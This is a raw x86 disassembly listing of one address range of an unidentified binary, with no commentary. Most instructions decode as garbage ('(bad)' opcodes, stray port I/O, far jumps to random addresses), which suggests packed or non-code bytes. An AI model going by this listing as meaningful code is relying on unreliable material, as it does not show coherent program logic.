  408a95:	mov    esi,DWORD PTR [edi+0x5a5cd93c]
  408a9b:	add    DWORD PTR [edi+ecx*8],0xffffffb6
  408a9f:	dec    esi
  408aa0:	jg     0x408a90
  408aa2:	inc    eax
  408aa3:	dec    eax
  408aa4:	(bad)  
  408aa5:	sub    edx,DWORD PTR [edx]
  408aa7:	lods   eax,DWORD PTR ds:[esi]
  408aa8:	(bad)  
  408aa9:	out    0xb4,eax
  408aab:	sbb    esp,0x4096f391
  408ab1:	in     al,dx
  408ab2:	xchg   edx,eax
  408ab3:	mov    ebp,0x27d5a3ee
  408ab8:	cmp    al,0xe9
  408aba:	ror    DWORD PTR [esi+0xd],cl
  408abd:	xor    dh,ch
  408abf:	shl    BYTE PTR [edi+eiz*2],1
  408ac2:	push   ecx
  408ac3:	cmp    bp,0x3d80
  408ac8:	push   ebx
  408ac9:	ror    DWORD PTR [edx-0x38],cl
  408acc:	push   edi
  408acd:	pop    DWORD PTR [ecx]
  408acf:	pop    ecx
  408ad0:	les    esi,FWORD PTR [eax+eax*2]
  408ad3:	add    DWORD PTR [edi+0x6ef397a0],edi
  408ad9:	loop   0x408ac8
  408adb:	pop    ss
  408adc:	leave  
  408add:	push   es
  408ade:	iret   
  408adf:	jg     0x408aed
  408ae1:	inc    eax
  408ae2:	les    esi,FWORD PTR [esi-0x46396ed6]
  408ae8:	in     eax,0xfc
  408aea:	aas    
  408aeb:	adc    eax,0x1c900764
  408af0:	clc    
  408af1:	jmp    0x68b7d7cd
  408af6:	fcom   QWORD PTR [eax]
  408af8:	inc    eax
  408af9:	daa    
  408afa:	pop    es
  408afb:	in     al,0xb2
  408afd:	push   eax
  408afe:	xchg   BYTE PTR [ebx-0x3a],dh
  408b01:	push   es
  408b02:	push   esi
  408b03:	add    edi,DWORD PTR [esi+0x19128661]
  408b09:	inc    ebp
  408b0a:	push   esi
  408b0b:	paddd  mm1,QWORD PTR [edx]
  408b0e:	pop    ecx
  408b0f:	push   0x618d4fc6
  408b14:	sbb    DWORD PTR [eax-0x34],0xf155d6f
  408b1b:	xchg   ebx,eax
  408b1c:	shl    BYTE PTR [edi-0x74],cl
  408b1f:	mov    dl,0xbf
  408b21:	jp     0x408ae8
  408b23:	test   al,0x46
  408b25:	or     BYTE PTR [ebx+0x55],0xb8
  408b29:	sbb    al,0x89
  408b2b:	test   eax,0x254384da
  408b30:	push   ebp
  408b31:	ror    ebp,1
  408b33:	mov    al,0x5c
  408b35:	push   edx
  408b36:	and    al,0x5a
  408b38:	inc    ebx
  408b39:	jmp    0x408abb
  408b3b:	mov    edx,0x18935f7a
  408b40:	retf   0xfb35
  408b43:	(bad)  
  408b44:	fs aad 0xee
  408b47:	int3   
  408b48:	pop    edx
  408b49:	adc    BYTE PTR [eax],bh
  408b4b:	(bad)  
  408b4c:	in     al,dx
  408b4d:	clc    
  408b4e:	repnz (bad) 
  408b52:	pop    esi
  408b53:	ret    
  408b54:	adc    BYTE PTR ss:[ebx],dl
  408b57:	(bad)  [edx-0x38b176cf]
  408b5d:	test   BYTE PTR [edi+0x2e7c2753],cl
  408b63:	mov    bh,0x2b
  408b65:	ss inc esp
  408b67:	sub    edi,DWORD PTR [esi-0x3d]
  408b6a:	ins    DWORD PTR es:[edi],dx
  408b6b:	popa   
  408b6c:	dec    ebp
  408b6d:	push   esi
  408b6e:	ja     0x408b15
  408b70:	stos   BYTE PTR es:[edi],al
  408b71:	push   ebx
  408b72:	sbb    ch,BYTE PTR [esi-0x2bb1d6c8]
  408b78:	sub    al,0xe8
  408b7a:	fild   QWORD PTR [ebx]
  408b7c:	cmp    BYTE PTR [ebp-0x9],bl
  408b7f:	lea    edi,[ecx]
  408b81:	scas   al,BYTE PTR es:[edi]
  408b82:	cmp    eax,0x109e67f8
  408b87:	sbb    dh,0x42
  408b8a:	out    0x63,eax
  408b8c:	xor    cl,BYTE PTR [esi]
  408b8e:	outs   dx,DWORD PTR ds:[esi]
  408b8f:	fcmove st,st(7)
  408b91:	addr16 test edx,esi
  408b94:	cs test al,bl
  408b97:	test   al,0x79
  408b99:	stos   DWORD PTR es:[edi],eax
  408b9a:	scas   al,BYTE PTR es:[edi]
  408b9b:	inc    eax
  408b9c:	jle    0x408bb3
  408b9e:	pop    edi
  408b9f:	sbb    dl,ch
  408ba1:	add    bl,BYTE PTR [esi-0x11]
  408ba4:	cmp    BYTE PTR [edx],0xa0
  408ba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ba8:	or     edx,DWORD PTR [edx-0x1d]
  408bab:	in     eax,dx
  408bac:	fidiv  DWORD PTR [edi]
  408bae:	adc    BYTE PTR [ebx-0x7bbb982c],ch
  408bb4:	shl    DWORD PTR [edx+0x1e06b612],1
  408bba:	dec    esp
  408bbb:	cs inc ecx
  408bbd:	cpuid  
  408bbf:	pop    eax
  408bc0:	dec    edx
  408bc1:	mulps  xmm7,XMMWORD PTR [edi+0x2]
  408bc5:	aas    
  408bc6:	pop    es
  408bc7:	into   
  408bc8:	(bad)  
  408bc9:	push   ecx
  408bca:	xor    ecx,ebx
  408bcc:	mov    bh,0x9d
  408bce:	add    BYTE PTR ds:[esi-0x7de79f39],bh
  408bd5:	scas   al,BYTE PTR es:[edi]
  408bd6:	fdiv   QWORD PTR [ecx]
  408bd8:	retf   0x65
  408bdb:	sbb    al,0xd3
  408bdd:	xchg   edx,eax
  408bde:	mov    edi,0xdb560ee3
  408be3:	shl    BYTE PTR [ebx],0x14
  408be6:	push   esp
  408be7:	push   esp
  408be8:	je     0x408bae
  408bea:	jb     0x408c0b
  408bec:	and    edx,ecx
  408bee:	dec    ecx
  408bef:	fwait
  408bf0:	mov    dh,0x1c
  408bf2:	xchg   edx,eax
  408bf3:	fsubr  st,st(7)
  408bf5:	dec    eax
  408bf6:	push   esp
  408bf7:	cs xchg esi,eax
  408bf9:	out    dx,al
  408bfa:	sub    DWORD PTR [eax],ebp
  408bfc:	sar    BYTE PTR ds:0xe4547e67,0x78
  408c03:	pop    ss
  408c04:	das    
  408c05:	pop    es
  408c06:	imul   edx,edx,0xffffff8d
  408c09:	xor    BYTE PTR [ebp-0x4a],bh
  408c0c:	int3   
  408c0d:	call   0x2339:0x72053918
  408c14:	out    dx,eax
  408c15:	xor    esp,DWORD PTR [ebx+0x72]
  408c18:	inc    ecx
  408c19:	mov    ch,0x7b
  408c1b:	mov    esi,0xe9ca9c11
  408c20:	(bad)  
  408c22:	push   ebp
  408c23:	(bad)  
  408c24:	dec    ecx
  408c25:	jns    0x408c9a
  408c27:	fidivr DWORD PTR [ecx-0x63]
  408c2a:	outs   dx,BYTE PTR ds:[esi]
  408c2b:	cmp    BYTE PTR [esi+0x433d6af9],0xc3
  408c32:	xchg   esp,eax
  408c33:	popf   
  408c34:	mov    al,0xb2
  408c36:	daa    
  408c37:	sbb    eax,0x8b0a3a52
  408c3c:	jecxz  0x408c32
  408c3e:	ffreep st(3)
  408c40:	inc    edi
  408c41:	xchg   edi,eax
  408c42:	push   ds
  408c43:	pop    ebx
  408c44:	mov    edx,0x495921db
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  edi,QWORD PTR [ebx+0xb]
  408c72:	outs   dx,DWORD PTR ds:[esi]
  408c73:	bound  eax,QWORD PTR [edi-0x27]
  408c76:	jo     0x408ce8
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408ca4
  408c7d:	mov    dh,0x2d
  408c7f:	and    DWORD PTR [ebp+0x73],ecx
  408c82:	sbb    DWORD PTR [edx+0x5b009cfb],0x2c3a4e45
  408c8c:	cwde   
  408c8d:	pop    edi
  408c8e:	mov    ebp,0x3edfae5e
  408c93:	mov    DWORD PTR [eax-0x2402107b],edx
  408c99:	out    0x20,al
  408c9b:	xchg   ecx,eax
  408c9c:	jmp    0x9b88:0xbae0f0dc
  408ca3:	xchg   ebx,eax
  408ca4:	jp     0x408c76
  408ca6:	mov    dh,0xa3
  408ca8:	ror    BYTE PTR [ebp+eax*8-0x68],1
  408cac:	jmp    0xfa0b89ee
  408cb1:	enter  0x7037,0x98
  408cb5:	jle    0x408c75
  408cb7:	jecxz  0x408d24
  408cb9:	adc    al,0x67
  408cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cbc:	loope  0x408d3d
  408cbe:	jmp    0x656e26c0
  408cc3:	push   cs
  408cc4:	push   ebx
  408cc5:	mov    DWORD PTR [ebx+0x16c500e7],esp
  408ccb:	ret    
  408ccc:	(bad)  
  408ccd:	push   ecx
  408cce:	lods   eax,DWORD PTR ds:[esi]
  408ccf:	jg     0x408cc7
  408cd1:	add    bh,BYTE PTR [edx]
  408cd3:	push   edx
  408cd4:	adc    esi,DWORD PTR [ecx]
  408cd6:	nop
  408cd7:	sbb    DWORD PTR gs:[edx-0x64],ebx
  408cdb:	fsub   st(3),st
  408cdd:	sub    al,0xeb
  408cdf:	xor    ch,BYTE PTR [ecx+0x7390e68d]
  408ce5:	adc    ah,BYTE PTR [ebx+0x61]
  408ce8:	fadd   DWORD PTR [edx+0xc6425d7]
  408cee:	ret    
  408cef:	mov    esi,0x8bfc3746
  408cf4:	(bad)  
  408cf5:	std    
  408cf6:	add    al,0x3a
  408cf8:	or     eax,0x7699a7db
  408cfd:	jmp    0x408c82
  408cff:	add    al,0x4f
  408d01:	xor    bl,BYTE PTR [edx+0x10]
  408d04:	mov    ch,0xc9
  408d06:	mov    edi,0x83a55ee0
  408d0b:	dec    ebp
  408d0c:	or     eax,0x60362d0a
  408d11:	cdq    
  408d12:	xor    DWORD PTR [eax+ebp*1-0x4a],0xffffffe8
  408d17:	ror    al,0xff
  408d1a:	mov    cl,0x40
  408d1c:	pop    ebp
  408d1d:	test   BYTE PTR [edi+0x30dacccd],0x46
  408d24:	cwde   
  408d25:	adc    esp,eax
  408d27:	adc    eax,edi
  408d29:	into   
  408d2a:	xor    DWORD PTR [ecx+ecx*8],ecx
  408d2d:	pushf  
  408d2e:	adc    ebp,edi
  408d30:	adc    bl,dl
  408d32:	xor    ah,BYTE PTR [eax+eax*2-0x22e258b2]
  408d39:	mov    dl,0x1f
  408d3b:	lea    esp,[edi-0x2d]
  408d3e:	outs   dx,BYTE PTR ds:[esi]
  408d3f:	mov    dl,0x2a
  408d41:	in     eax,0x71
  408d43:	sub    DWORD PTR [edi],edx
  408d45:	xor    ebp,esi
  408d47:	jp     0x408d49
  408d49:	lahf   
  408d4a:	push   ebx
  408d4b:	push   es
  408d4c:	bound  esp,QWORD PTR [ecx+edi*4+0x2a]
  408d50:	ret    
  408d51:	idiv   DWORD PTR cs:[ecx]
  408d54:	sahf   
  408d55:	lods   al,BYTE PTR ds:[esi]
  408d56:	mov    ds:0x380e48b7,al
  408d5b:	and    edx,DWORD PTR [edi-0x74]
  408d5e:	ss xor dl,dl
  408d61:	sti    
  408d62:	inc    edi
  408d63:	inc    ebp
  408d64:	cdq    
  408d65:	and    edi,DWORD PTR [ebp-0x79]
  408d68:	in     al,dx
  408d69:	ins    DWORD PTR es:[edi],dx
  408d6a:	in     al,0x34
  408d6c:	or     al,0x1b
  408d6e:	cmp    DWORD PTR [ebx-0x34],eax
  408d71:	cmp    ah,BYTE PTR [edx]
  408d73:	ror    al,cl
  408d75:	jne    0x408db7
  408d77:	mov    eax,0xa558f3ee
  408d7c:	in     al,dx
  408d7d:	add    dl,BYTE PTR [esi+0x30]
  408d80:	jbe    0x408df9
  408d82:	jmp    0x1541:0xef3102a8
  408d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d8a:	in     eax,dx
  408d8b:	cmc    
  408d8c:	add    al,0xad
  408d8e:	in     al,dx
  408d8f:	sbb    DWORD PTR [edx],eax
  408d91:	pop    ecx
  408d92:	push   esi
  408d93:	or     bl,0x49
  408d96:	mov    ds:0x1d49ef17,al
  408d9b:	cmp    eax,0x9d3b6677
  408da0:	sbb    al,0xf8
  408da2:	xor    al,0xeb
  408da4:	inc    eax
  408da5:	out    0x92,al
  408da7:	js     0x408d51
  408da9:	sub    BYTE PTR [ecx+ebp*1-0x42],dh
  408dad:	sar    BYTE PTR [ebx-0x4419b46d],1
  408db3:	aam    0x87
  408db5:	fld    QWORD PTR [edi-0x3d]
  408db8:	add    al,0x4f
  408dba:	xchg   DWORD PTR [ebp+0x6f729c48],ebx
  408dc0:	jb     0x408d52
  408dc2:	inc    edx
  408dc3:	shl    DWORD PTR [esi+0x729435c4],1
  408dc9:	sbb    BYTE PTR [edi+0x2587fcb0],0x0
  408dd0:	lock lea ebp,[ecx]
  408dd3:	mov    bl,0x26
  408dd5:	das    
  408dd6:	mov    BYTE PTR [edx-0x5],0x64
  408dda:	or     DWORD PTR [ebp+0x21ce4cff],edi
  408de0:	and    DWORD PTR [ecx+ecx*2+0x48003e12],ecx
  408de7:	xor    bl,BYTE PTR [edx]
  408de9:	jle    0x408dcd
  408deb:	jae    0x408e2f
  408ded:	stc    
  408dee:	and    al,bh
  408df0:	out    dx,eax
  408df1:	mov    edi,0xdc4ab810
  408df6:	cld    
  408df7:	mov    ah,0xcc
  408df9:	mov    esp,0xb968c58b
  408dfe:	mov    esi,0x37e7b30a
  408e03:	push   edi
  408e04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e05:	mov    dl,0x25
  408e07:	repz sbb dh,BYTE PTR [edx]
  408e0a:	(bad)  
  408e0b:	loope  0x408e5e
  408e0d:	sub    bl,al
  408e0f:	popa   
  408e10:	bts    DWORD PTR [ebp-0x4],eax
  408e14:	(bad)
  408e18:	mov    eax,ds:0x2b55ce38
  408e1d:	cmp    al,0x86
  408e1f:	push   ecx
  408e20:	sub    ecx,DWORD PTR [esi]
  408e22:	sti    
  408e23:	push   ss
  408e24:	pop    esi
  408e25:	loop   0x408e34
  408e27:	fidiv  WORD PTR ds:0x9c7a1d01
  408e2d:	xor    bh,BYTE PTR [esi]
  408e2f:	scas   eax,DWORD PTR es:[edi]
  408e30:	mov    ebp,0x7b1f5e1a
  408e35:	and    eax,0x39a2360a
  408e3a:	cld    
  408e3b:	repnz in eax,dx
  408e3d:	xlat   BYTE PTR ds:[ebx]
  408e3f:	mov    eax,0x182ab96b
  408e44:	jmp    0x408e78
  408e46:	adc    al,0x65
  408e48:	fistp  WORD PTR [esi]
  408e4a:	or     ah,al
  408e4c:	stos   BYTE PTR es:[edi],al
  408e4d:	push   ss
  408e4e:	dec    DWORD PTR [eax]
  408e50:	into   
  408e51:	outs   dx,BYTE PTR ds:[esi]
  408e52:	daa    
  408e53:	xchg   BYTE PTR [eax+0x6],cl
  408e56:	popa   
  408e57:	fadd   DWORD PTR ss:[edi-0x60]
  408e5b:	add    al,BYTE PTR fs:[esi]
  408e5e:	sbb    edx,0xffffffab
  408e61:	mov    ebp,0xe105001f
  408e66:	mov    dh,0x3a
  408e68:	cmc    
  408e69:	add    eax,0xc6f5caf1
  408e6e:	push   edi
  408e6f:	into   
  408e70:	or     DWORD PTR [ebx-0x574c7c7c],edi
  408e76:	or     BYTE PTR [ebx-0x27755025],0xb8
  408e7d:	sub    eax,DWORD PTR [edx+0x40644345]
  408e83:	leave  
  408e84:	adc    al,0xb7
  408e86:	sub    eax,DWORD PTR es:[ebx+0x33]
  408e8a:	push   cs
  408e8b:	mul    BYTE PTR [ecx+0x766bbd4e]
  408e91:	push   ds
  408e92:	arpl   WORD PTR [ecx-0x2f170f2b],cx
  408e98:	inc    esi
  408e99:	dec    esp
  408e9a:	sbb    ch,BYTE PTR [edi]
  408e9c:	sub    esp,ecx
  408e9e:	dec    eax
  408e9f:	cmp    DWORD PTR [ebx-0x60],ecx
  408ea2:	fsubr  DWORD PTR [edi]
  408ea4:	and    eax,0x770b74d8
  408ea9:	xchg   esp,eax
  408eaa:	je     0x408e3f
  408eac:	sub    eax,0x4fa0fdaf
  408eb1:	jmp    0x9741d3a4
  408eb6:	and    esp,esp
  408eb8:	mov    DWORD PTR [ecx],ecx
  408eba:	inc    ebp
  408ebb:	jb     0x408f2b
  408ebd:	add    eax,0xf1265637
  408ec2:	xlat   BYTE PTR ds:[ebx]
  408ec3:	push   eax
  408ec4:	fwait
  408ec5:	xor    ah,BYTE PTR [eax]
  408ec7:	pop    ss
  408ec8:	imul   ebx,DWORD PTR [ebp-0x7eb214bf],0x52
  408ecf:	in     al,dx
  408ed0:	xchg   DWORD PTR [esi+eiz*4+0x2ae4c354],esi
  408ed7:	pop    esp
  408ed8:	adc    ebp,DWORD PTR [esi+eax*8+0x7d]
  408edc:	mov    esp,0x646abfde
  408ee1:	dec    edi
  408ee2:	cs xor bh,ah
  408ee5:	mul    dl
  408ee7:	and    eax,0xaee16af8
  408eec:	sti    
  408eed:	or     BYTE PTR ds:0x5bc68a33,bh
  408ef3:	push   edi
  408ef4:	das    
  408ef5:	aad    0x77
  408ef7:	pop    esp
  408ef8:	icebp  
  408ef9:	(bad)  
  408efa:	int    0x72
  408efc:	ror    DWORD PTR [edx-0x60],1
  408eff:	add    edi,DWORD PTR [esi-0x735e6061]
  408f05:	ret    0x2431
  408f08:	ss dec ebp
  408f0a:	adc    edx,esp
  408f0c:	dec    edx
  408f0d:	scas   al,BYTE PTR es:[edi]
  408f0e:	adc    al,0xda
  408f10:	mov    al,ds:0x1ff502bc
  408f15:	jle    0x408e9b
  408f17:	and    BYTE PTR [edi],bh
  408f19:	push   ecx
  408f1a:	sbb    al,BYTE PTR [ebp+0x1e7a1755]
  408f20:	pop    ss
  408f21:	xlat   BYTE PTR ds:[ebx]
  408f22:	inc    esi
  408f23:	mov    edi,0x570493e
  408f28:	aaa    
  408f29:	jmp    0x408f3b
  408f2b:	cli    
  408f2c:	jecxz  0x408f0c
  408f2e:	(bad)  
  408f2f:	add    WORD PTR [esi+0x4d8febcf],bp
  408f36:	out    dx,al
  408f37:	dec    eax
  408f38:	or     BYTE PTR [ebp-0x2f1d5ad1],dh
  408f3e:	xchg   ebx,eax
  408f3f:	(bad)  
  408f40:	cmc    
  408f41:	push   edi
  408f42:	xchg   edi,eax
  408f43:	hlt    
  408f44:	adc    ebx,edi
  408f46:	and    eax,0x37dfd9a5
  408f4b:	int    0xb3
  408f4d:	setge  BYTE PTR [ebp+ecx*8-0x73]
  408f52:	jae    0x408edf
  408f54:	adc    BYTE PTR [eax],al
  408f56:	stos   DWORD PTR es:[edi],eax
  408f57:	mov    al,0x59
  408f59:	jge    0x408fb9
  408f5b:	pop    ecx
  408f5c:	out    0x2e,al
  408f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f5f:	mov    edx,0xa04c81a
  408f64:	fidivr DWORD PTR [ebx+esi*4]
  408f67:	rdmsr  
  408f69:	xchg   ebp,esp
  408f6b:	cmp    al,0x85
  408f6d:	mov    ds:0x16a6c22c,eax
  408f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f73:	repnz pop eax
  408f75:	add    al,BYTE PTR [esi+0x6]
  408f78:	cmp    ebp,DWORD PTR [eax-0x61]
  408f7b:	cmp    ebx,DWORD PTR [ebx+ebx*4-0x23]
  408f7f:	bound  edx,QWORD PTR [esi+0x9]
  408f82:	popf   
  408f83:	pusha  
  408f84:	jge    0x408fa3
  408f86:	xchg   ebx,eax
  408f87:	dec    ecx
  408f88:	mov    esi,0x87987948
  408f8d:	jecxz  0x408f6e
  408f8f:	push   ecx
  408f90:	retf   
  408f91:	dec    edx
  408f92:	movnti DWORD PTR [ebp-0xa],esi
  408f96:	stos   DWORD PTR es:[edi],eax
  408f97:	cwde   
  408f98:	xchg   ebp,eax
  408f99:	rcl    DWORD PTR [ebp+0x66],cl
  408f9c:	xor    al,0x8c
  408f9e:	test   eax,0xfdeeb6da
  408fa3:	adc    DWORD PTR [eax],ebp
  408fa5:	push   ecx
  408fa6:	xchg   ebp,eax
  408fa7:	icebp  
  408fa8:	test   edx,0x30ff6a6e
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x181937f3
  408fc6:	scas   eax,DWORD PTR es:[edi]
  408fc7:	(bad)  cs:[edi-0x1a]
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408fb8
  408fd2:	jnp    0x408ffa
  408fd4:	push   es
  408fd5:	repz enter 0x2ee6,0x8
  408fda:	jg     0x408f61
  408fdc:	xchg   ebp,eax
  408fdd:	cs inc esp
  408fdf:	adc    BYTE PTR [ebp+0x1a],0xa9
  408fe3:	xor    cl,BYTE PTR [eax]
  408fe5:	iret   
  408fe6:	xchg   ebx,eax
  408fe7:	cmc    
  408fe8:	sbb    BYTE PTR [edi+0x6a],al
  408feb:	xchg   esi,eax
  408fec:	xor    dl,BYTE PTR [ebp-0x18]
  408fef:	jmp    0xedf1d5a4
  408ff4:	or     BYTE PTR es:[edi-0x17971d49],bl
  408ffb:	mov    ds:0x3a2dd024,eax
  409000:	ret    0xbad9
  409003:	push   esi
  409004:	imul   edi,DWORD PTR [esi+ecx*8],0x43
  409008:	lods   eax,DWORD PTR ds:[esi]
  409009:	jle    0x409078
  40900b:	fdivr  DWORD PTR [edx-0x6b]
  40900e:	ja     0x408fb1
  409010:	sbb    ebp,DWORD PTR [esi+0x4a]
  409013:	mov    WORD PTR [esi+0x22],?
  409016:	call   0xb2cc:0x4868b005
  40901d:	das    
  40901e:	(bad)  
  40901f:	inc    eax
  409020:	loop   0x409044
  409022:	jae    0x408fdf
  409024:	call   0x21a4:0x98b27036
  40902b:	push   edx
  40902c:	(bad)  
  40902e:	neg    DWORD PTR [edx-0x43]
  409031:	lods   al,BYTE PTR ds:[esi]
  409032:	cmp    al,0x6b
  409034:	adc    esi,DWORD PTR [ecx+ebx*1-0x43]
  409038:	inc    eax
  409039:	xor    al,ah
  40903b:	inc    eax
  40903c:	loope  0x4090ac
  40903e:	in     eax,0xc0
  409040:	mov    DWORD PTR [esi+0x7f9a1ac6],ebx
  409046:	gs mov cl,0x49
  409049:	stos   DWORD PTR es:[edi],eax
  40904a:	aaa    
  40904b:	cmp    BYTE PTR [eax+ebx*1],0xdf
  40904f:	sti    
  409050:	(bad)  
  409051:	mov    ds,WORD PTR [ebp+0x48ec215b]
  409057:	xchg   DWORD PTR [edi+eiz*1+0x38],ebx
  40905b:	jnp    0x409006
  40905d:	inc    edi
  40905e:	int    0xb8
  409060:	and    al,0x89
  409062:	repnz push cs
  409064:	(bad)
  409067:	cli    
  409068:	addr16 icebp 
  40906a:	hlt    
  40906b:	jne    0x47eda554
  409071:	(bad)  
  409072:	dec    ebx
  409073:	jb     0x4090b1
  409075:	mov    ecx,DWORD PTR [edi-0x38]
  409078:	sub    ch,BYTE PTR [ebx-0x6894567f]
  40907e:	mov    BYTE PTR [ebp-0x4f],0x91
  409082:	out    0x3c,al
  409084:	mov    ds:0x979f2145,eax
  409089:	sbb    DWORD PTR [edi-0x15],0x5e4acee9
  409090:	push   ebp
  409091:	xor    al,BYTE PTR [ecx-0x26]
  409094:	out    0xa1,eax
  409096:	packsswb mm4,QWORD PTR [ebx+0x1e]
  40909a:	fld    DWORD PTR [edx+eax*4+0x463ce272]
  4090a1:	fidivr WORD PTR [edi+0x243133ed]
  4090a7:	or     BYTE PTR [ebx+0x2d381d4d],ch
  4090ad:	inc    ebp
  4090ae:	mov    bh,0xed
  4090b0:	push   ds
  4090b1:	mov    cl,0x32
  4090b3:	in     eax,dx
  4090b4:	sbb    al,0x1e
  4090b6:	ja     0x40903c
  4090b8:	dec    esp
  4090b9:	cdq    
  4090ba:	retf   0x4a67
  4090bd:	dec    ebp
  4090be:	cmp    al,0xa4
  4090c0:	pop    ebp
  4090c1:	rcl    DWORD PTR [edi],1
  4090c3:	cmc    
  4090c4:	mov    al,0xad
  4090c6:	dec    esi
  4090c7:	mov    ah,0x41
  4090c9:	out    dx,al
  4090ca:	sub    BYTE PTR [ebx+0x41c35cfb],al
  4090d0:	fmul   QWORD PTR [edi]
  4090d2:	aad    0xda
  4090d4:	jmp    0xc7eb:0x2b3d68ad
  4090db:	mov    edi,0xee6a9085
  4090e0:	fcomp  QWORD PTR [edx+edi*8]
  4090e3:	sub    al,0xd1
  4090e5:	push   esi
  4090e6:	mov    ecx,0x1d4e390a
  4090eb:	jb     0x40912b
  4090ed:	shr    BYTE PTR [eax+0x7f],cl
  4090f0:	lea    ebx,[ebx-0x49543d34]
  4090f6:	adc    edi,DWORD PTR [esi+0xe]
  4090f9:	sar    eax,1
  4090fb:	dec    esp
  4090fc:	fild   DWORD PTR ds:0x18225bd8
  409102:	mov    ds:0x2139d035,al
  409107:	repnz push ds
  409109:	shr    DWORD PTR [edi+0x270e992c],0xca
  409110:	aad    0xcd
  409112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409113:	(bad)  
  409115:	(bad)  
  409116:	adc    bh,BYTE PTR [eax-0x57fbb9f9]
  40911c:	js     0x40919d
  40911e:	jo     0x4090b9
  409120:	xor    al,0x4b
  409122:	daa    
  409123:	push   cs
  409124:	(bad)  
  409126:	xchg   ecx,eax
  409127:	aam    0xc6
  409129:	stos   BYTE PTR es:[edi],al
  40912a:	out    0x6d,eax
  40912c:	cdq    
  40912d:	add    BYTE PTR [ebx-0x44],ch
  409130:	das    
  409131:	clc    
  409132:	xor    al,0xbb
  409134:	jecxz  0x409147
  409136:	or     al,0x64
  409138:	add    DWORD PTR [esi+0x5989697e],0x6f
  40913f:	jp     0x40911e
  409141:	mov    edx,0x5fded3b8
  409146:	enter  0xee75,0xea
  40914a:	push   0xb5b2a7ed
  40914f:	lods   eax,DWORD PTR ds:[esi]
  409150:	cmp    DWORD PTR [eax],ecx
  409152:	jg     0x409149
  409154:	mov    ch,0xbd
  409156:	xchg   edi,eax
  409157:	enter  0x54a1,0xef
  40915b:	xchg   BYTE PTR [edx],ah
  40915d:	dec    esi
  40915e:	sar    DWORD PTR [eax+0x7b0e3bd6],1
  409164:	pop    eax
  409165:	cs pop ebp
  409167:	test   eax,0x5cf8e6d7
  40916c:	ins    BYTE PTR es:[edi],dx
  40916d:	outs   dx,DWORD PTR ds:[esi]
  40916e:	mov    ds:0x141753cc,eax
  409173:	xchg   DWORD PTR [ebp-0x61],ecx
  409176:	aam    0x7
  409178:	sar    DWORD PTR [edi-0x2473f852],0x27
  40917f:	pop    eax
  409180:	push   ds
  409181:	leave  
  409182:	leave  
  409183:	mov    ?,WORD PTR [eax+ebx*1-0x7ea3f420]
  40918a:	into   
  40918b:	and    dl,BYTE PTR [esi-0x649dca63]
  409191:	fwait
  409192:	push   edx
  409193:	clc    
  409194:	pop    ebp
  409195:	mov    esi,0xc8382e9d
  40919a:	ficomp DWORD PTR [edx+esi*8+0x2c1e776e]
  4091a1:	and    eax,0x43eeb5c9
  4091a6:	iret   
  4091a7:	shl    DWORD PTR [ebx-0x7b],0x45
  4091ab:	in     al,0x2a
  4091ad:	cdq    
  4091ae:	jbe    0x4091a3
  4091b0:	stos   BYTE PTR es:[edi],al
  4091b1:	sub    DWORD PTR [esi+0x53],esi
  4091b4:	ret    
  4091b5:	adc    dl,dh
  4091b7:	div    BYTE PTR [edi+0x33]
  4091ba:	les    esp,FWORD PTR [esi]
  4091bc:	shl    edx,0xfb
  4091bf:	and    al,0x81
  4091c1:	daa    
  4091c2:	(bad)  
  4091c3:	out    0x41,eax
  4091c5:	and    BYTE PTR ds:0x1b0ac2a9,bh
  4091cb:	rcl    BYTE PTR [esi+0xc07b43b],0xb7
  4091d2:	add    BYTE PTR [ecx],bh
  4091d4:	shl    DWORD PTR [esi-0x57b2a8b4],1
  4091da:	sahf   
  4091db:	pop    es
  4091dc:	inc    ebp
  4091dd:	add    dl,BYTE PTR [edi+esi*2-0x32]
  4091e1:	and    ebx,DWORD PTR [eax]
  4091e3:	push   0xffffff9b
  4091e5:	cmp    al,cl
  4091e7:	pop    ds
  4091e8:	js     0x4091a1
  4091ea:	dec    ecx
  4091eb:	in     al,dx
  4091ec:	inc    eax
  4091ed:	jp     0x409258
  4091ef:	xor    DWORD PTR [esi+edx*2],edi
  4091f2:	and    al,0xc7
  4091f4:	aam    0xd7
  4091f6:	das    
  4091f7:	inc    edi
  4091f8:	cmp    bh,BYTE PTR [ebx+0x1aeedd15]
  4091fe:	mov    DWORD PTR [eax],ebx
  409200:	xor    eax,0xa4cc23b6
  409205:	fsub   QWORD PTR [eax+0x35]
  409208:	test   DWORD PTR [edx],0x5eba8346
  40920e:	sub    ah,bh
  409210:	das    
  409211:	ja     0x4091a9
  409213:	sar    ebx,0xc0
  409216:	jno    0x4091a2
  409218:	pop    ebx
  409219:	add    al,0xbb
  40921b:	dec    ebx
  40921c:	xrelease mov DWORD PTR [eax+0x73],0xfdbcef75
  409224:	hlt    
  409225:	stos   DWORD PTR es:[edi],eax
  409226:	cmp    ecx,DWORD PTR [ebp+0x1a]
  409229:	adc    ch,BYTE PTR [ecx+eax*1]
  40922c:	cmc    
  40922d:	push   0x1755c784
  409232:	inc    edx
  409233:	daa    
  409234:	xchg   ecx,eax
  409235:	lahf   
  409236:	addr16 sub al,0x25
  409239:	and    DWORD PTR [edi],edx
  40923b:	dec    eax
  40923c:	sbb    BYTE PTR [ecx-0x4d],al
  40923f:	inc    esp
